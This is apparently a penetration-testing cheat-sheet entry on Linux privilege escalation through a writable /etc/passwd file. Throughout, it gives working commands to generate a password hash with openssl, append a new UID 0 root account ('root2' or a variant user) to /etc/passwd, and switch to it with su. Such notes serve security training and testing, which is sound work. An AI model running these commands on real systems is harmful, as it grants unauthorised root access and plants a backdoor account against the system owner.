---
title: Writable /etc/passwd
category: privesc
subcategory: linux-privesc
os: linux
command: openssl passwd w00t
tools: openssl, su
---


### Generate password hash

```bash
openssl passwd w00t
```

### Append a UID 0 user

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

### Variant

```bash
openssl passwd haslo123
echo "nowyuser:HASHHASLA:0:0:root:/root:/bin/bash" >> /etc/passwd
```
